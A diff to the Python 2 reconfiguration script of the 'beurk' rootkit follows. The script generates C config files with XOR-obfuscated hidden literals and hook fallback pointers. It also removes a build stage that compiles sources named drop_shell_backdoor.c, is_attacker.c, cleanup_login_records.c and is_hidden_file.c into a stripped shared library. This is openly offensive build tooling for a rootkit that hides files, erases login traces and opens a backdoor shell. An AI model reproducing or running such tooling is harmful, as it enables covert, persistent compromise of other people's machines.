@@ -1,5 +1,9 @@
 #!/usr/bin/env python2
 
+# reconfigure beurk rootkit, given a configuration file
+# (beurk.conf by default).
+# this script is called by the provided Makefile.
+
 import sys
 import os
 import re
@@ -60,11 +64,6 @@ CONFIG_KEYS = {
         "LIBRARY_NAME": type_str,
         "DEBUG_LEVEL": type_int,
         "DEBUG_FILE": type_str,
-        "ENABLE_PTRACE": type_bool,
-        "ENABLE_PAM": type_bool,
-        "ENABLE_PCAP": type_bool,
-        "ENABLE_SSL": type_bool,
-        "CC": type_str,
         "XOR_KEY": type_hexbyte,
         "MAGIC_STRING": type_str,
         "PAM_USER": type_str,
@@ -190,6 +189,19 @@ CONFIG_H = """/*
 #include <stdlib.h>
 
 /* common macros from beurk config file*/
+%(common_macros)s
+
+/* store hidden (XORed) literals */
+#define NUM_LITERALS (%(num_literals)d)
+#define MAX_LITERAL_SIZE (%(max_literal_size)d)
+extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
+
+/* store real function pointers (hooks fallbacks) */
+#define NUM_HOOKS (%(num_hooks)d)
+ssize_t (*__non_hooked_symbols[NUM_HOOKS])();
+
+/* hidden literals and function pointers */
+%(literals_macros)s
 """
 
 CONFIG_C = """/*
@@ -220,10 +232,9 @@ CONFIG_C = """/*
 """
 
 
-
-# add all config vars to header
+# add all config vars to header (common_macros)
 # (except for type_str and type_hidden_literal)
-macros = ""
+common_macros = ""
 macro_tpl = "#define %(key)s (%(value)s)\n"
 for key, _type in CONFIG_KEYS.items():
     if _type == type_str:
@@ -237,13 +248,10 @@ for key, _type in CONFIG_KEYS.items():
         value = int(value)
     else:
         fatal_error("no determined action for %r" %  _type.__name__)
-    macros += macro_tpl % {"key": key, "value": value}
-
-CONFIG_H += macros
+    common_macros += macro_tpl % {"key": key, "value": value}
 
 
 # add hidden literals to config.h
-
 def xor(string, key):
     """xor (obfuscate) given string with XOR_KEY config var
     """
@@ -252,22 +260,6 @@ def xor(string, key):
         result += "%s, " % hex(ord(char) ^ key)
     result += "0x00},"
     return result
-
-literals_code = """
-
-/* store hidden (XORed) literals */
-#define NUM_LITERALS (%(num_literals)d)
-#define MAX_LITERAL_SIZE (%(max_literal_size)d)
-extern char __hidden_literals[NUM_LITERALS][MAX_LITERAL_SIZE];
-
-/* store real function pointers (hooks fallbacks) */
-#define NUM_HOOKS (%(num_hooks)d)
-ssize_t (*__non_hooked_symbols[NUM_HOOKS])();
-
-
-/* hidden literals and function pointers */
-%(literals_macros)s
-"""
 
 xor_key = 0x00 if config["DEBUG_LEVEL"] else config["XOR_KEY"]
 
@@ -296,23 +288,27 @@ for _type, name in function_hooks:
     max_literal_size = max(max_literal_size, len(name))
     num_literals += 1
     num_hooks += 1
-
 max_literal_size += 1
 
-CONFIG_H += literals_code % {
+CONFIG_H %= {
+        "common_macros": common_macros,
         "max_literal_size": max_literal_size + 1,
         "num_literals": num_literals,
         "num_hooks": len(function_hooks),
         "literals_macros": "\n".join(literals_macros),
         }
 
-
 CONFIG_C %= {
         "literals": "\n    ".join(literals),
         }
-# write CONFIG_H into config.h
+
+# write CONFIG_H into includes/config.h
 open("includes/config.h", 'w').write(CONFIG_H)
+print("%s: file 'includes/config.h' correctly reconfigured" % sys.argv[0])
+
+# write CONFIG_C into src/config.c
 open("src/config.c", "w").write(CONFIG_C)
+print("%s: file 'src/config.c' correctly reconfigured" % sys.argv[0])
 
 
 ###############################################################################
@@ -343,79 +339,9 @@ def check_lib_dependencies(*checklibs):
     return False if missing_deps else True
 
 checklibs = []
-if config["ENABLE_PCAP"]:
-    checklibs.append("libpcap")
-if config["ENABLE_PAM"]:
-    checklibs.append("libpam")
-if config["ENABLE_SSL"]:
-    checklibs.append("libssl")
+checklibs.append("libpcap")
+checklibs.append("libpam")
+checklibs.append("libssl")
 
 if not check_lib_dependencies(*checklibs):
     abort("missing dependencies")
-
-
-###############################################################################
-### compile library
-
-def run_build_command(cmd):
-    """function which runs a build shell command
-    """
-    cmd = cmd.format(**config)
-    print(cmd)
-    if os.system(cmd) != 0:
-        abort("build command failed")
-
-SOURCES = [
-        "src/init.c",
-        "src/config.c",
-        "src/drop_shell_backdoor.c",
-        "src/is_attacker.c",
-        "src/cleanup_login_records.c",
-        "src/is_hidden_file.c",
-        ]
-# automagically add every hooks to SOURCES
-SOURCES += glob("src/hooks/*.c")
-
-config["CFLAGS"] = """
--Iincludes
--Wall
--Wextra
--Wdisabled-optimization
--Winline
--Wunknown-pragmas
--mtune=native
--D_GNU_SOURCE
-""".replace("\n", " ")
-
-if not config["DEBUG_LEVEL"]:
-    config["CFLAGS"] += " -fvisibility=hidden "
-
-config["LDFLAGS"] = "-lc -ldl -lutil "
-if config["ENABLE_PAM"]:
-    config["LDFLAGS"] += "-lpam "
-
-# build objects from sources
-for source in SOURCES:
-    dest = source.replace(".c", ".o")
-    run_build_command("{CC} {CFLAGS} -fPIC -g -c %s -o %s" % (source, dest))
-
-# build library from objects
-objects = " ".join([x.replace(".c", ".o") for x in SOURCES])
-
-if "unknown option" in commands.getoutput("ld -soname /dev/null").lower():
-    set_ld_soname = ""
-else:
-    set_ld_soname = "-Wl,-soname,{LIBRARY_NAME} ".format(**config)
-
-run_build_command("{CC} -fPIC -shared " + set_ld_soname \
-        + objects + " {LDFLAGS} -o {LIBRARY_NAME}")
-
-# remove object files afterwards (keep them if in debug mode
-# in order to be able tu run some tests that need object files
-# to extrapolate on symbols)
-if config["DEBUG_LEVEL"] == 0:
-    run_build_command("rm -f " + objects)
-
-# strip if no debug mode
-if config["DEBUG_LEVEL"] == 0:
-    run_build_command("strip --strip-unneeded -R .note -R .comment {LIBRARY_NAME}")
